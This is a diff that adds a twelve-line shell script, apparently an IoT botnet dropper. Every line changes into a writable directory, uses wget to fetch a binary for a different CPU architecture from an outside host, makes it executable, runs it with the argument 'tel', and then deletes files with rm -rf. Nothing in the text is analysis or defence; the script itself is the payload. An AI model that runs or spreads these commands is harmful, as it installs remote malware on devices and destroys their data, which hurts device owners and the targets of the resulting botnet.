@@ -1,0 +1,12 @@
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://fbi.mikuchannel.site/top1hbt.arm; chmod 777 top1hbt.arm; ./top1hbt.arm tel; rm -rf *
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://fbi.mikuchannel.site/top1hbt.arm5; chmod 777 top1hbt.arm5; ./top1hbt.arm5 tel; rm -rf *
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://fbi.mikuchannel.site/top1hbt.arm6; chmod 777 top1hbt.arm6; ./top1hbt.arm6 tel; rm -rf *
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://fbi.mikuchannel.site/top1hbt.arm7; chmod 777 top1hbt.arm7; ./top1hbt.arm7 tel; rm -rf *
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://fbi.mikuchannel.site/top1hbt.sh4; chmod 777 top1hbt.sh4; ./top1hbt.sh4 tel; rm -rf *
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://fbi.mikuchannel.site/top1hbt.arc; chmod 777 top1hbt.arc; ./top1hbt.arc tel; rm -rf *
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://fbi.mikuchannel.site/top1hbt.mips; chmod 777 top1hbt.mips; ./top1hbt.mips tel; rm -rf *
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://fbi.mikuchannel.site/top1hbt.mipsel; chmod 777 top1hbt.mipsel; ./top1hbt.mipsel tel; rm -rf *
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://fbi.mikuchannel.site/top1hbt.sparc; chmod 777 top1hbt.sparc; ./top1hbt.sparc tel; rm -rf *
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://fbi.mikuchannel.site/top1hbt.x86_64; chmod 777 top1hbt.x86_64; ./top1hbt.x86_64 tel; rm -rf *
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://fbi.mikuchannel.site/top1hbt.i686; chmod 777 top1hbt.i686; ./top1hbt.i686 tel; rm -rf *
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://fbi.mikuchannel.site/top1hbt.i586; chmod 777 top1hbt.i586; ./top1hbt.i586 tel; rm -rf *
